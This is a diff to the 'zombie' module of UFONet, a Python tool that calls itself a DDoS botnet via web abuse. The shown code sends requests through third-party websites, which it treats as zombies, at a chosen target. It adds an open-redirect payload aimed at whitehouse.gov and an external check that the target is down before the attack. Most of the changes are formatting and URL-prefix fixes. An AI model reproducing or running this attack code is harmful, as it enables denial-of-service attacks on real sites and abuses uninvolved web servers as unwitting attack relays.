@@ -1,13 +1,13 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS attacks via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)
+UFONet - DDoS Botnet via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import pycurl, StringIO, md5
+import pycurl, StringIO, md5, re
 import time, threading, random
 from randomip import RandomIP
 
@@ -28,7 +28,7 @@ class Zombie: # class representing a zombie
         with self.ufo.sem:
             self.ufo.herd.new_zombie(self.zombie)
             reply=self.do_connect()
-            self.ufo.herd.kill_zombie(self.zombie,reply, self.connection_failed)
+            self.ufo.herd.kill_zombie(self.zombie, reply, self.connection_failed)
             return reply
 
     # handles zombie connection
@@ -41,13 +41,15 @@ class Zombie: # class representing a zombie
             c.setopt(pycurl.URL, self.zombie) # set 'self.zombie' target
             c.setopt(pycurl.NOBODY, 1) # use HEAD
         if self.payload == True:
-            payload = self.zombie + "http://www.google.es" #Open Redirect payload
+            payload = self.zombie + "https://www.whitehouse.gov" #Open Redirect payload [requested by all UFONet motherships ;-)]
             c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
             c.setopt(pycurl.NOBODY, 0) # use GET
         if self.ufo.external == True:
-            external_service = "http://www.downforeveryoneorjustme.com/"
-            if options.target.startswith('https://'): # fixing downforeveryoneorjustme url prefix problems
-                options.target = options.target.replace('https://','http://')
+            external_service = "http://www.downforeveryoneorjustme.com/" # external check
+            if options.target.startswith('https://'): # fixing url prefix
+                options.target = options.target.replace('https://','')
+            if options.target.startswith('http://'): # fixing url prefix
+                options.target = options.target.replace('http://','')
             external = external_service + options.target
             c.setopt(pycurl.URL, external) # external HEAD check before to attack
             c.setopt(pycurl.NOBODY, 0) # use GET
@@ -169,4 +171,6 @@ class Zombie: # class representing a zombie
             attack_reply = h.getvalue()
             if options.verbose:
                 print "[Response] code: ", c.getinfo(c.RESPONSE_CODE)," time ",c.getinfo(c.TOTAL_TIME)," size ", len(attack_reply)
-            return [ c.getinfo(c.RESPONSE_CODE), c.getinfo(c.TOTAL_TIME), len(attack_reply)]
+            return [    c.getinfo(c.RESPONSE_CODE), 
+                        c.getinfo(c.TOTAL_TIME), 
+                        len(attack_reply)]
